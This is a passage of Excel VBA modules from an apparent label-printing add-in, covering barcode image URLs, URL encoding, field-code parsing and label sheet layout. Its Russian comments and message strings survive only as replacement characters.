    UF.Show: DoEvents
    'Application.EnableCancelKey = xlDisabled
    If Len(Control_Name$) Then
        Set objParent = UF.Controls(Control_Name$).Parent
        Do While Not objParent Is Nothing
            If TypeName(objParent) = "Page" Then
                If TypeName(objParent.Parent) = "MultiPage" Then
                    objParent.Parent.Value = objParent.Parent.Pages(objParent.Name).Index
                End If
            End If
            Err.Clear: i = i + 1: Set objParent = objParent.Parent
            If Err <> 0 Or i > 20 Then Exit Do
        Loop

        PrevColor& = UF.Controls(Control_Name$).BackColor
        UF.Controls(Control_Name$).BackColor = RGB(255, 0, 0)
    End If

    If Len(Labels_Name$) Then
        For Each Label_Name In Split(Labels_Name$, "|")
            With UF.Controls(Label_Name)
                .ForeColor = RGB(255, 0, 0)
                For i = 1 To IIf(UBound(Split(Labels_Name$, "|")) = 0, 6, 4)
                    .Visible = i Mod 2 = 0: t = Timer: While Abs(Timer - t) < 0.2: DoEvents: Wend
                Next
            End With
        Next
    End If

    If Len(Control_Name$) Then
        UF.Controls(Control_Name$).BackColor = PrevColor&
        UF.Controls(Control_Name$).SetFocus
    End If
    'Application.EnableCancelKey = xlInterrupt
    For i = 1 To 1000: DoEvents: Next
End Sub




Attribute VB_Name = "mod_Barcodes"
'---------------------------------------------------------------------------------------
' Module        : mod_Barcodes
' Author        : EducatedFool                     Date: 18.11.2019
' Professional application development for Microsoft Excel
' https://ExcelVBA.ru/         Skype: ExcelVBA.ru
'---------------------------------------------------------------------------------------
Option Compare Text: Option Explicit: Option Private Module

Function GetBarcodeImageURL(ByVal BarcodeType$, ByVal txt$, Optional Size& = 0) As String
    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| txt$ |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
    ' |fffd| BarcodeType$ (qr - QR code |fffd||fffd||fffd| dmx - Data Matrix)
    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd| QR |fffd||fffd||fffd||fffd||fffd|
    Dim EncodedText$, URL$
    
    Select Case BarcodeType$
        Case "qr"
            If Size& <= 0 Then Size& = 300
            URL$ = "http://barcode.tec-it.com/barcode.ashx?code=QRCode&unit=Fit&imagetype=Png&download=true&dmsize=Default&download=true&data={text}"
            URL$ = "https://tamali.net/barcode/2d/qr/img/?level=M&razmer=" & Size& & "&vid=0&text={text}"
            
        Case "dmx"
            URL$ = "https://barcode.tec-it.com/barcode.ashx?code=DataMatrix&unit=Fit&dpi=96&imagetype=Png&dmsize=Default&download=true&data={text}"
            URL$ = "https://tamali.net/barcode/2d/datamatrix/img/?type_s=dmtx&type_s=dmtx&vid=0&text={text}"
            
        Case ""
            If IsURL(txt, True) Then GetBarcodeImageURL = txt: Exit Function
    End Select
    
    GetBarcodeImageURL = Replace(URL$, "{text}", True_URLEncode(txt$))
    ' Debug.Print txt$
    ' Debug.Print True_URLEncode(txt$)
End Function

Function LoadBarcodeIntoShape(ByRef sha As Shape) As Boolean
    On Error Resume Next
    Dim objectName$, BarcodeSize&, txt$, URL$
    objectName$ = Split(sha.Name, "_")(0)
    BarcodeSize& = Val(Split(sha.Name, "_")(1))
    txt$ = sha.TextFrame.Characters.Text
    
    Select Case True
        Case objectName$ Like "qr*"
            URL = GetBarcodeImageURL("qr", txt$, BarcodeSize&)
            
        Case objectName$ Like "dmx*"
            URL = GetBarcodeImageURL("dmx", txt$, BarcodeSize&)
            
        Case Else ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd| / |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|
            URL = GetBarcodeImageURL("", txt$)
            'Debug.Print txt, URL
            
    End Select
    
    If URL = "" Then Exit Function
    
    sha.TextFrame.Characters.Text = ""
    sha.Fill.UserPicture URL
    
End Function

Function IsURL(ByVal txt$, Optional ByVal AllowFileURL As Boolean) As Boolean
    On Error Resume Next
    IsURL = IsURL Or (txt$ Like "http://?*.?*")
    IsURL = IsURL Or (txt$ Like "https://?*.?*")
    IsURL = IsURL Or (txt$ Like "ftp://?*.?*")
    If AllowFileURL Then
        IsURL = IsURL Or (txt$ Like "\\?*\?*")
        IsURL = IsURL Or (txt$ Like "[A-Z]:\?*")
    End If
End Function

Function True_URLEncode(ByVal txt As String) As String
    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| URLencode   http://en.wikipedia.org/wiki/Percent-encoding
    On Error Resume Next: Dim i&, l$, t$
    For i = 1 To Len(txt)
        l = Mid(txt, i, 1)
        Select Case AscW(l)
            Case Is > 4095
                t = "%" & Hex(AscW(l) \ 64 \ 64 + 224) & "%" & Hex(AscW(l) \ 64) & "%" & Hex(8 * 16 + AscW(l) Mod 64)
            Case 48 To 57, 45, 46, 95, 65 To 90, 97 To 122, 126
                t = l
            Case Is > 127
                t = "%" & Hex(AscW(l) \ 64 + 192) & "%" & Hex(8 * 16 + AscW(l) Mod 64)
            Case Else
                t = "%" & Hex(AscW(l)): If Len(t) = 2 Then t = "%0" & Hex(AscW(l))
        End Select
        True_URLEncode = True_URLEncode & t
    Next
End Function

Attribute VB_Name = "mod_Functions"
'---------------------------------------------------------------------------------------
' Module        : modFunctions                    Version:
' Author        : Igor Vakhnenko                   Date: 13.06.2016
' Professional application development for Microsoft Excel
' http://ExcelVBA.ru/        info@excelvba.ru      Skype: ExcelVBA.ru
'---------------------------------------------------------------------------------------

'Option Compare Text: Option Explicit: Option Private Module

Function ColumnNameByColumnNumber(ByVal col As Long) As String
    resA1 = Application.ConvertFormula("=r1c" & col, xlR1C1, xlA1)
    ColumnNameByColumnNumber = col & " |fffd|" & Split(resA1, "$")(1) & "|fffd|"
End Function

Function OUTPUT_FOLDER$(Optional ByVal CreateFolderIfNotExist As Boolean = False)
    On Error Resume Next
    outputFolder$ = ThisWorkbook.Path & "\Files\"
    If SETT.GetText("TextBox_OutputFolder") = "" Then
        SETT.SetText "TextBox_OutputFolder", outputFolder$
    End If
    If CreateFolderIfNotExist Then If Dir(outputFolder$, vbDirectory) = "" Then MkDir outputFolder$
    
    OUTPUT_FOLDER$ = SETT.GetText("TextBox_OutputFolder")
End Function

Function ShapeFieldNames(ByRef sha As Shape) As Collection ' |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|
    On Error Resume Next
    Dim txt$: txt = sha.TextFrame.Characters.Text
    Set ShapeFieldNames = CodesFromTextString(txt)
End Function

Function RangeFieldNames(ByVal ra As Range) As Collection ' |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|
    On Error Resume Next
    Dim txt$, sha As Shape
    txt$ = Replace(Range2TXT(ra), "}", "}" & vbNewLine)
    
    For Each sha In ra.Worksheet.Shapes
        txt$ = txt$ & vbNewLine & sha.TextFrame.Characters.Text
    Next
    
    Set RangeFieldNames = CodesFromTextString(txt)
End Function

Function CodesFromTextString(ByRef txt$) As Collection
    On Error Resume Next
    Dim res, field$, Item
    Set CodesFromTextString = New Collection
    
    With REGEXP
        .Global = True
        .Pattern = "\{[^{}]+\}"
        If .test(txt$) Then
            Set res = .Execute(txt$)
            For Each Item In res
                field = Item.Value
                CodesFromTextString.Add field, CStr(field)
            Next
        End If
    End With
End Function

Function GetShapesForRange(ByRef ra As Range) As Collection
    On Error Resume Next
    Dim sha As Shape, txt$
    Set GetShapesForRange = New Collection
    For Each sha In ra.Worksheet.Shapes
        If Not Intersect(ra, sha.TopLeftCell) Is Nothing Then
            txt = "": txt = sha.TextFrame.Characters.Text
            If Len(txt) > 0 Then GetShapesForRange.Add sha
        End If
    Next sha
End Function

Function Range2TXT(ByRef ra As Range, Optional ByVal ColumnsSeparator$ = vbTab, _
        Optional ByVal RowsSeparator$ = vbNewLine) As String
    If ra.Cells.Count = 1 Then Range2TXT = ra.Value & RowsSeparator$: Exit Function
    If ra.Areas.Count > 1 Then
        Dim ar As Range
        For Each ar In ra.Areas
            Range2TXT = Range2TXT & Range2TXT(ar, ColumnsSeparator$, RowsSeparator$)
        Next ar
        Exit Function
    End If
    arr = ra.Formula
    For i = LBound(arr, 1) To UBound(arr, 1)
        txt = "":
        For j = LBound(arr, 2) To UBound(arr, 2)
            txt = txt & ColumnsSeparator$ & arr(i, j)
        Next j
        Range2TXT = Range2TXT & Mid(txt, Len(ColumnsSeparator$) + 1) & RowsSeparator$
    Next i
End Function

Function RepeatRange(ByRef SourceRange As Range, ByVal Count As Long, _
        ByVal Offset As Long, ByVal Direction As XlDirection) As Range
    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| SourceRange,
    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| Count, |fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| Offset
    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| SourceRange,
    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| Offset |fffd||fffd||fffd||fffd||fffd| Count |fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| Direction.
    
    Select Case Direction
        Case xlDown: OffsetX = 0: OffsetY = Offset
        Case xlUp: OffsetX = 0: OffsetY = -Offset
        Case xlToRight: OffsetX = Offset: OffsetY = 0
        Case xlToLeft: OffsetX = -Offset: OffsetY = 0
    End Select
    
    Set RepeatRange = SourceRange
    For i = 1 To Count - 1
        Set RepeatRange = Union(RepeatRange, SourceRange.Offset(OffsetY * i, OffsetX * i))
    Next i
End Function


Function TaggingSheet(ByRef sh As Worksheet, tr As Range, ByVal LC As Long) As Boolean
    ' |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| sh |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| LC
    ' (|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|,
    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|)
    
    On Error Resume Next
    pi.StartNewAction 5, 10, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|..."
    
    Dim count_w As Long, count_h As Long        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|
    Dim UseIndents As Boolean        ' |fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
    Dim IndentWidth As Double        ' |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
    Dim CutLine As Boolean        ' |fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
    Dim CutLineType As XlLineStyle        ' |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
    
    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
    count_w = SETT.GetNumber("ComboBox_count_w", 2)
    count_h = SETT.GetNumber("ComboBox_count_h", 3)
    
    UseIndents = SETT.GetBoolean("CheckBox_UseIndents")
    IndentWidth = SETT.GetNumber("ComboBox_IndentWidth", 10)
    
    CutLine = SETT.GetBoolean("CheckBox_CutLine")
    CutLineType = xlContinuous: If SETT.GetBoolean("OptionButton_LineDotted") Then CutLineType = xlDot
    
    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
    Dim tw As Long, th As Long        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|
    tw = tr.Columns.Count: th = tr.Rows.Count
    
    msg = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|: " & _
        th & " |fffd||fffd||fffd||fffd||fffd| |fffd||fffd| " & tw & "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|" & vbNewLine & vbNewLine & _
        "|fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|?"
    If th > 100 Then If MsgBox(msg, vbQuestion + vbYesNo + vbDefaultButton2, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|?") = vbNo Then Exit Function
    If tw > 50 Then If MsgBox(msg, vbQuestion + vbYesNo + vbDefaultButton2, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|?") = vbNo Then Exit Function
    
    
    Dim sepW As Double, sepH As Double        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| (|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd|)
    ' |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| )))
    sepW = IndentWidth * 100 / 208 / 2 * IndentWidth / (IndentWidth + Log(150 / IndentWidth) * 2)
    sepH = IndentWidth * 100 / 39 / 2
    
    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
    
    sh.UsedRange.Clear
    'ActiveWindow.View = xlPageBreakPreview
    sh.ResetAllPageBreaks
    With sh.PageSetup
        .Zoom = False: .FitToPagesWide = 1: .FitToPagesTall = False
    End With
    
    ' count_w As Long, count_w As Long    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|
    ' tw As Long, th As Long              ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|
    ' UseIndents As Boolean               ' |fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
    
    
    BlocksCountX = count_w
    BlocksCountY = Application.WorksheetFunction.RoundUp(LC / count_w, 0)
    D = IIf(UseIndents, 2, 0)        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|
    
    BlocksHeight = BlocksCountY * th + (BlocksCountY - 1) * D
    BlocksWidth = BlocksCountX * tw + (BlocksCountX - 1) * D
    
    
    pi.StartNewAction 10, 15, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| ...", , , BlocksCountY
    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|
    If UseIndents Then
        
        pi.SubAction , "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| ..."
        For i = 1 To BlocksCountX - 1
            With sh.Cells(1, 1 + i * tw + (i - 1) * D)
                .Resize(, 2).ColumnWidth = sepW
                If CutLine Then
                    .Resize(BlocksHeight).Borders(xlEdgeRight).LineStyle = CutLineType
                    .Resize(BlocksHeight).Borders(xlEdgeRight).Weight = xlThin
                End If
            End With
        Next
        
        For i = 1 To BlocksCountY - 1
            pi.SubAction , "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| ...", _
                "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| " & i & " |fffd||fffd| " & BlocksCountY - 1 & ""
            DoEvents
            With sh.Cells(1 + i * th + (i - 1) * D, 1)
                .Resize(2).RowHeight = sepH
                If i Mod count_h = 0 Then        ' |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
                    Err.Clear
                    sh.HPageBreaks.Add .Offset(1)
                    'If Err Then Debug.Print Err.Number, Err.Description
                    .Offset(1).EntireRow.Hidden = True
                Else        ' |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|
                    If CutLine Then
                        .Resize(, BlocksWidth).Borders(xlEdgeBottom).LineStyle = CutLineType
                        .Resize(, BlocksWidth).Borders(xlEdgeBottom).Weight = xlThin
                    End If
                End If
            End With
        Next
    End If
    ActiveWindow.View = xlNormalView
    
    pi.StartNewAction 15, 35, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd| ...", " ", " ", BlocksCountY + BlocksCountX
    ' |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|
    For i = 1 To LC
        'Debug.Print "===========  |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| # " & i
        
        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd|
        currX = 1 + ((i - 1) Mod count_w): currY = 1 + (i - 1) \ count_w
        'Debug.Print "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd|: ", currX, currY
        
        cellX = 1 + (currX - 1) * (tw + D): cellY = 1 + (currY - 1) * (th + D)
        'Debug.Print "|fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|:   cellX = " & cellX & ",   cellY = " & cellY
        
        sh.Cells(cellY, cellX) = "# " & i
        sh.Cells(cellY, cellX).Resize(th, tw).BorderAround xlContinuous, xlMedium
        
        Err.Clear
        If currY = 1 Then        ' |fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| - |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
            pi.SubAction "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| ...", _
                "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| " & currX & " |fffd||fffd| " & BlocksCountX & ""
            
            tr.Rows(1).Copy
            sh.Cells(cellY, cellX).PasteSpecial xlPasteColumnWidths
        End If
        
        If currX * currY = 1 Then        ' |fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| - |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|
            For r = 1 To tr.Rows.Count
                pi.SubAction "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| ...", _
                    "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| " & r & " |fffd||fffd| " & tr.Rows.Count & ""
                RepeatRange(sh.Rows(cellY).Offset(r - 1), BlocksCountY, th + D, xlDown).RowHeight = _
                    tr.Rows(r).RowHeight
            Next r
        End If
        
        sh.Cells(cellY, cellX) = "# " & i
        'pi.Line3 = "|fffd||fffd||fffd||fffd| " & i & " |fffd||fffd| " & lc & " - |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|..."
        'tr.Copy sh.Cells(cellY, cellX)
    Next i
    
    ActiveWindow.Zoom = 100
    sh.Cells(1).Select
    
    TaggingSheet = True
End Function

Function CreateLabelsWorksheet(ByVal SheetNameSuffix$) As Worksheet
    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|
    
    On Error Resume Next: Err.Clear
    pi.StartNewAction 0, 5, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|...", "|fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|-|fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
    Application.DisplayAlerts = False
    Worksheets(SHEET_NAME).Delete
    Application.DisplayAlerts = True
    
    Dim sh As Worksheet, WorksheetNumber&        ', WB As Workbook
    If SETT.GetBoolean("CheckBox_SaveSheetAsFile") Then
        sht.Copy: DoEvents
        
        If ActiveWorkbook.Worksheets.Count > 1 Or ActiveWorkbook.Path <> "" Then
            msg = "|fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|-|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd|"
            MsgBox msg, vbExclamation, "|fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|": Exit Function
        End If
        
        Set sh = ActiveWorkbook.Worksheets(1)
        If sh.Name <> sht.Name Then
            msg = "|fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|-|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd|"
